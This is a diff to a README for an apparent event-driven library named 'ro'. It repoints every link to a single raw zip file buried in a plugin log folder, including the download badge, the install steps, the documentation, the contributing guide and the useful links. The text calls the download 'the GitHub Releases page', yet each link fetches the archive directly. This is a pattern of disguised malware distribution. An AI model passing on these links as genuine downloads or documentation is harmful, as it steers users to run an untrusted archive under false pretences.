@@ -1,6 +1,6 @@
 # 🏎️ ro - Build Event-Driven Applications Easily
 
-[![Download ro](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip)](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip)
+[![Download ro](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip)](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run "ro," ensure you meet the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download ro](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip).
+To get started, visit this page to download the software: [Download ro](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip).
 
 1. Click on the link above to open the GitHub Releases page.
 2. Look for the latest release version.
@@ -52,7 +52,7 @@ After installation, you can start using "ro" to develop your applications. Here�
    ```
 
 4. **Add Reactive Features:**
-   Begin adding features using the available API. Refer to the [documentation](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip) for detailed examples.
+   Begin adding features using the available API. Refer to the [documentation](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip) for detailed examples.
 
 5. **Run Your Application:**
    Use the following command to start your application:
@@ -62,7 +62,7 @@ After installation, you can start using "ro" to develop your applications. Here�
 
 ## 📚 Documentation
 
-For a deeper understanding of features and functionalities, check the complete documentation available [here](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip). This resource provides in-depth explanations and examples to help you navigate through various functionalities.
+For a deeper understanding of features and functionalities, check the complete documentation available [here](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip). This resource provides in-depth explanations and examples to help you navigate through various functionalities.
 
 ## 🔍 Community Support
 
@@ -73,13 +73,13 @@ Join our community to ask questions and share ideas:
 
 ## 🛠️ Contributing
 
-If you're interested in contributing to the "ro" project, we welcome your input. Check out our [Contributing Guide](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip) for more details on how you can help improve this software.
+If you're interested in contributing to the "ro" project, we welcome your input. Check out our [Contributing Guide](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip) for more details on how you can help improve this software.
 
 ## 🔗 Useful Links
 
-- [Download ro](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip)
-- [Documentation](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip)
-- [Contributing Guide](https://raw.githubusercontent.com/yraead/ro/main/reddsman/ro.zip)
+- [Download ro](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip)
+- [Documentation](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/yraead/ro/main/plugins/observability/log/Software-1.2.zip)
 
 ## 📝 License
 
